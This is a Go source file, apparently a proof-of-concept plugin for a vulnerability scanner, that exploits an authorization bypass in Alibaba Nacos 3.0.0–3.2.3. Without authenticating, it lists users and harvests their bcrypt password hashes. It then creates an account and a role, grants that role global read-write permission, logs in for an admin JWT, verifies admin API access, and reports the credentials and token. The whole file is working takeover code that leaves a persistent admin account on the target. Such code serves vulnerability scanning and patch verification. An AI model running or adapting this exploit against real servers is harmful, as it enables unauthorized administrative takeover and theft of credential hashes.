package poc

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"git.threatbook-inc.cn/vulteam/mythos/v2/pkg/constant"
	"git.threatbook-inc.cn/vulteam/mythos/v2/pkg/utils/randutil"
	"git.threatbook-inc.cn/vulteam/mythos/v2/pkg/xhttp"
	"git.threatbook-inc.cn/vulteam/mythos/v2/plugins/plugin"
	"git.threatbook-inc.cn/vulteam/mythos/v2/types"
)

const nacosTakeoverCacheWait = 15 * time.Second // 权限缓存刷新窗口（默认 15s）

func init() {
	plugin.Register(&NACOS_UNAUTH_ADMIN_TAKEOVER{})
}

type NACOS_UNAUTH_ADMIN_TAKEOVER struct {
}

func (s *NACOS_UNAUTH_ADMIN_TAKEOVER) MetaInfo() *types.PluginInfo {
	f := &types.Finger{
		Applications: []string{"NACOS", "Alibaba-Nacos"},
		Protocols:    nil,
	}
	vul := &types.Vulnerability{
		XID: "XVE-2026-53002",
	}
	return &types.PluginInfo{
		Name:     "poc-go-http-alibaba-nacos-unauth-admin-takeover",
		Category: constant.UrlType,
		Tags:     []string{"alibaba", "nacos", "auth-bypass"},
		Vuln:     vul,
		Finger:   f,
	}
}

func (s *NACOS_UNAUTH_ADMIN_TAKEOVER) Init() error {
	return nil
}

func (s *NACOS_UNAUTH_ADMIN_TAKEOVER) Scan(ctx context.Context, target *types.Target) (*types.TaskOutput, error) {
	// [0] 指纹/路径探测：自动识别 / 与 /nacos 上下文。
	// /v3/auth/{user,role,permission} 鉴权作用域错配（落入默认不鉴权的 OPEN_API 桶，
	// 影响 3.0.0-3.2.3），匿名即可创建用户/角色并授予 resource=* rw，完全接管。
	var (
		prefix     string
		resps      []*xhttp.Response
		listResp   *xhttp.Response
	)
	for _, p := range []string{"/nacos", ""} {
		r, err := nacosTakeoverRequest(ctx, target, http.MethodGet, p, "",
			"/v3/auth/user/list?pageNo=1&pageSize=100")
		if err != nil {
			continue
		}
		if r.GetStatus() != 200 || !strings.Contains(string(r.GetBody()), "pageItems") {
			continue
		}
		prefix, listResp = p, r
		break
	}
	if listResp == nil {
		return nil, nil
	}
	resps = append(resps, listResp)

	// [1] 侧证：匿名读取用户列表（泄露用户名+bcrypt 哈希）
	leakedUsers := nacosParseLeakedUsers(listResp.GetBody())

	// [2] 匿名创建随机用户；403 说明已修复（>=3.2.4 / 3.3.0）
	username := "poc_" + randutil.RandStr(10)
	password := randutil.RandStr(6) + "!" + randutil.RandStr(8)
	role := "r_" + randutil.RandStr(6)
	createUserResp, err := nacosTakeoverRequest(ctx, target, http.MethodPost, prefix, "",
		fmt.Sprintf("/v3/auth/user?username=%s&password=%s", username, password))
	if err != nil {
		return nil, err
	}
	resps = append(resps, createUserResp)
	if createUserResp.GetStatus() != 200 {
		return nil, nil
	}

	// [3] 匿名创建角色并绑定
	roleResp, err := nacosTakeoverRequest(ctx, target, http.MethodPost, prefix, "",
		fmt.Sprintf("/v3/auth/role?username=%s&role=%s", username, role))
	if err != nil {
		return nil, err
	}
	resps = append(resps, roleResp)

	// [4] 匿名授予 resource=* action=rw（全局读写）
	permResp, err := nacosTakeoverRequest(ctx, target, http.MethodPost, prefix, "",
		fmt.Sprintf("/v3/auth/permission?role=%s&resource=*&action=rw", role))
	if err != nil {
		return nil, err
	}
	resps = append(resps, permResp)

	// [5] 等待权限缓存刷新（默认 15s 窗口）
	time.Sleep(nacosTakeoverCacheWait)

	// [6] 登录自建账户拿 JWT
	loginResp, err := nacosTakeoverRequest(ctx, target, http.MethodPost, prefix, "",
		fmt.Sprintf("/v3/auth/user/login?username=%s&password=%s", username, password))
	if err != nil {
		return nil, err
	}
	resps = append(resps, loginResp)
	var login struct {
		AccessToken string `json:"accessToken"`
	}
	if loginResp.GetStatus() != 200 || json.Unmarshal(loginResp.GetBody(), &login) != nil || login.AccessToken == "" {
		// 建号/授权已成功，接管高度疑似（登录失败可能只是缓存窗口不足）
		return s.writeReport(target, resps, prefix, leakedUsers, username, password, "", "partial: account created, login failed"), nil
	}

	// [7] 携带 JWT 验证 ADMIN API 完全访问
	nsResp, err := nacosTakeoverRequest(ctx, target, http.MethodGet, prefix,
		login.AccessToken, "/v3/admin/core/namespace/list?pageNo=1&pageSize=10")
	if err != nil {
		return nil, err
	}
	resps = append(resps, nsResp)
	if nsResp.GetStatus() == 200 && strings.Contains(string(nsResp.GetBody()), "\"code\":0") {
		return s.writeReport(target, resps, prefix, leakedUsers, username, password, login.AccessToken,
			"full: anonymous -> global admin (ADMIN API verified)"), nil
	}

	return s.writeReport(target, resps, prefix, leakedUsers, username, password, login.AccessToken,
		"partial: admin JWT obtained, namespace/list check failed"), nil
}

func (s *NACOS_UNAUTH_ADMIN_TAKEOVER) writeReport(target *types.Target, resps []*xhttp.Response,
	prefix string, leakedUsers []map[string]string, username, password, token, result string) *types.TaskOutput {
	extracted := map[string]interface{}{
		"context_path": prefix,
		"takeover":     "POST /v3/auth/user + /v3/auth/role + /v3/auth/permission (resource=*, rw) -> admin JWT",
		"result":       result,
	}
	if len(leakedUsers) > 0 {
		extracted["leaked_users"] = leakedUsers
	}
	if token != "" {
		extracted["admin_account"] = username + " / " + password
		trunc := token
		if len(trunc) > 60 {
			trunc = trunc[:60] + "..."
		}
		extracted["jwt"] = trunc
	}
	report := &types.VulReport{
		Target:       target,
		Responses:    resps,
		PluginInfo:   s.MetaInfo(),
		ExtractedInfo: extracted,
	}
	return types.WriteVul(constant.HTTP, report)
}

// nacosParseLeakedUsers 提取匿名用户列表泄露的用户名与 bcrypt 哈希
func nacosParseLeakedUsers(body []byte) []map[string]string {
	var listResp struct {
		Data struct {
			PageItems []struct {
				Username string `json:"username"`
				Password string `json:"password"`
			} `json:"pageItems"`
		} `json:"data"`
	}
	if json.Unmarshal(body, &listResp) != nil {
		return nil
	}
	var users []map[string]string
	for _, item := range listResp.Data.PageItems {
		entry := map[string]string{"username": item.Username}
		if item.Password != "" {
			entry["bcrypt_hash"] = item.Password
		}
		users = append(users, entry)
	}
	return users
}

func nacosTakeoverRequest(ctx context.Context, target *types.Target, method, prefix, token, pathWithQuery string) (*xhttp.Response, error) {
	u := target.GetURL()
	full := strings.TrimSuffix(u.String(), "/") + prefix + pathWithQuery
	req, err := xhttp.NewRequest(method, full, nil)
	if err != nil {
		return nil, err
	}
	if token != "" {
		req.SetHeader("Authorization", "Bearer "+token)
	}
	return xhttp.Do(ctx, req)
}